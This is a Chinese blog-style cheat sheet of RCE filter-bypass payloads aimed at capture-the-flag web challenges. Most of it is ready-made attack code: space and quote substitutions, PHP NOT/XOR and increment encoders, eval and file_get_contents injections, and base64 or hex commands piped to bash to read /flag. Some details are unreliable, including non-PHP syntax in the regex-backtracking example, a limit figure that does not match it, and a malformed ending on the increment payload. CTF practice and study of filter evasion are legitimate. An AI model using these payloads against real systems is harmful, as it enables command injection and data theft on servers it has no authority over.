---
title: RCE漏洞绕过常用方法
date: 2024-01-26 23:07:07
tags: Web
mathjax: true
---

# RCE漏洞绕过常用方法

## 空格过滤

可代替空格的：

```
<
<>
%20
%09
$IFS$9
${IFS}
$IFS
{cat,/flag}
```

## 反斜杠绕过

```bash
c\at /flag
l\s /
```

## 取反绕过

构造脚本

```php
<?php
    fwrite(STDOUT,'[+]your function: ');
    $system=str_replace(array("\r\n","\r","\n"),"",fgets(STDIN));
    fwrite(STDOUT,'[+]your command: ');
    $command=str_replace(array("\r\n","\r","\n"),"",fgets(STDIN));
    echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
?>
```

## 异或绕过

常用脚本：

```php
<?php
    $a='phpinfo';
    for($i=0;$i<strlen($a);$i++)
        echo '%'.dechex(ord($a[$i])^0xff);
    echo "^";
    for($j=0;$j<strlen($a);$j++)
        echo '%ff';
?>
```

如果结果被过滤就用这个，设置可用字符即可。

```python
valid="1234567890!@$%^*(){}[];\'\",.<>/?-=_`~ "
answer=input()
tmp1,tmp2='',''
for c in answer:
    for i in valid:
        for j in valid:
            if ord(i)^ord(j)==ord(c):
                tmp1+=i
                tmp2+=j
                break
        else:
            continue
        break
print(f'"{tmp1}"^"{tmp2}"')
```

## 自增绕过

例如引发phpinfo的payload如下，其中变量“\_”可逃脱过滤，直接传入：

```
$=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);&_=phpinfo();
```

## 黑名单绕过

```
//变量拼接
b=ag;cat /fl$b

//读根目录
eval(var_dump(scandir('/'););
//读flag
eval(var_dump(file_get_contents($_POST['a'])););&a=/flag

//打开ls扩展下文件
cat `ls`

//下划线被过滤 php<8时 变量名中第一个非法字符[被替换为下划线
N[S.S即为N_S.S
e[v.a.l即为e_v.a.l

//标签绕过
?><?= phpinfo(); ?>
```

## 编码绕过

```
//Base64绕过
`echo Y2F0IC9mbGFn | base64 -d`
echo Y2F0IC9mbGFn | base64 -d | bash
$(echo Y2F0IC9mbGFn | base64 -d)

//Hex绕过
echo '636174202f666c6167' | xxd -r -p | bash
```

## 正则匹配绕过

```bash
cat /f???
cat /fl*
cat /f[a-z]{3}
```

## 引号绕过

```bash
ca""t /flag
l's' /
```

## cat替换命令

```bash
more less cat tac head tail vi vim nl od sort uniq xxd grep
file -f
```

## 回溯绕过

php正则回溯次数大于10000000次时返回False。

```php
$a='hello world'+'h'*1000000
preg_match("/hello.*world/is",$a)==False
```

## 无回显

```bash
//无回显RCE
ls / | tee 1.txt
cat /flag | tee 2.txt

//eval()无输出
eval(print`c\at /flag`;)
```
